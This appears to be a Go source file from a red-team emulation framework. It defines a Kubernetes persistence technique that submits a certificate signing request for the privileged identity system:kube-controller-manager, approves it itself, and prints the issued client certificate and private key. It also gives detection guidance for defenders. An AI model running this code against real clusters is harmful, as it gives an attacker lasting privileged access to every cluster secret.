package kubernetes

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/asn1"
	"encoding/pem"
	"errors"
	"fmt"
	"log"
	"time"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	certificates "k8s.io/api/certificates/v1"
	v1core "k8s.io/api/core/v1"

	v1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func init() {

	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.persistence.create-client-certificate",
		FriendlyName:       "Create Client Certificate Credential",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence},
		Description: `
Creates a client certificate for a privileged user. This client certificate can be used to authenticate to the cluster.

Warm-up: None

Detonation:

- Create a certificate signing request (CSR)
- Wait for the CSR to be picked up and return a certificate
- Print the client-side certificate and private key

Note: This attack technique does not succeed on AWS EKS. Due to apparent [undocumented behavior](https://github.com/aws/containers-roadmap/issues/1604), 
the managed EKS control plane does not issue a certificate for the certificate signing request (CSR), even when approved. However, it is still relevant
to simulate attacker behavior.

Note: The certificate is issued to <code>` + commonName + `</code> because it exists in most clusters, and already has a ClusterRoleBinding to <code>ClusterRole/system:kube-controller-manager</code>
which includes privileged permissions, such as access all secrets of the cluster and create tokens for any service account.
`,
		Detection: `
Using Kubernetes API server audit logs. In particular, look for creation and approval of CSR objects, which do 
not relate to standard cluster operation (e.g. Kubelet certificate issuance).
`,
		Detonate: detonate,
	})
}

const csrName = "stratus-red-team-csr"
const commonName = "system:kube-controller-manager"

func detonate(_ map[string]string, providers stratus.CloudProviders) error {
	client := providers.K8s().GetClient()

	key, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		return errors.New("Unable to generate a RSA key: " + err.Error())
	}
	subject := pkix.Name{
		CommonName: commonName,
	}
	asn1, err := asn1.Marshal(subject.ToRDNSequence())
	if err != nil {
		return errors.New("Unable to marshal ASN.1: " + err.Error())
	}
	csrReq := x509.CertificateRequest{
		RawSubject:         asn1,
		SignatureAlgorithm: x509.SHA256WithRSA,
	}
	bytes, err := x509.CreateCertificateRequest(rand.Reader, &csrReq, key)
	if err != nil {
		return errors.New("Unable to generate Certificate Signing request: " + err.Error())
	}
	csr := &certificates.CertificateSigningRequest{
		ObjectMeta: v1.ObjectMeta{
			Name: csrName,
		},
		Spec: certificates.CertificateSigningRequestSpec{
			Groups: []string{
				"system:authenticated",
			},
			SignerName: "kubernetes.io/kube-apiserver-client",
			Usages: []certificates.KeyUsage{
				"client auth",
			},
			Request: pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE REQUEST", Bytes: bytes}),
		},
	}

	log.Println("Issuing certificate signing request")
	_, err = client.CertificatesV1().CertificateSigningRequests().Create(context.Background(), csr, v1.CreateOptions{})
	if err != nil {
		return errors.New("Unable to create certificate signing request: " + err.Error())

	}

	csr.Status.Conditions = append(csr.Status.Conditions, certificates.CertificateSigningRequestCondition{
		Type:           certificates.CertificateApproved,
		Status:         v1core.ConditionTrue,
		Reason:         "User activation",
		Message:        "This CSR was approved",
		LastUpdateTime: v1.Now(),
	})
	csr, err = client.CertificatesV1().CertificateSigningRequests().UpdateApproval(context.Background(), csrName, csr, v1.UpdateOptions{})
	if err != nil {
		return errors.New("Unable to update Certificate approval: " + err.Error())
	}
	time.Sleep(2 * time.Second)
	csr, err = client.CertificatesV1().CertificateSigningRequests().Get(context.Background(), csr.GetName(), v1.GetOptions{})
	if err != nil {
		return errors.New("Unable to retrieve client certificate " + err.Error())
	}
	pb, _ := pem.Decode(csr.Status.Certificate)
	//This section is needed to handle cases where the CSR was created but signing didn't occur
	//For example EKS. We clean up the CSR first then exit.
	if pb == nil {
		_ = client.CertificatesV1().CertificateSigningRequests().Delete(context.Background(), csr.GetName(), v1.DeleteOptions{})
		return errors.New("unable to retrieve client certificate - signing did not happen. " +
			"Note that this attack technique cannot be successful for EKS, see https://github.com/aws/containers-roadmap/issues/1604")
	}

	issuedCert, err := x509.ParseCertificate(pb.Bytes)
	if err != nil {
		return errors.New("Unable to parse x509 certificate: " + err.Error())
	}

	log.Printf("Certificate successfully issued to %s, by %s, valid until %s\n", issuedCert.Subject.CommonName, issuedCert.Issuer.CommonName, issuedCert.NotAfter.String())
	fmt.Println(dumpPrivateKey(key))
	fmt.Println(dumpCertificate(issuedCert))

	err = client.CertificatesV1().CertificateSigningRequests().Delete(context.Background(), csr.GetName(), v1.DeleteOptions{})
	if err != nil {
		return errors.New("Unable to delete CSR: " + err.Error())
	}
	return nil
}

func dumpPrivateKey(key *rsa.PrivateKey) string {
	return string(pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(key),
		},
	))
}

func dumpCertificate(cert *x509.Certificate) string {
	return string(pem.EncodeToMemory(
		&pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert.Raw,
		}))
}
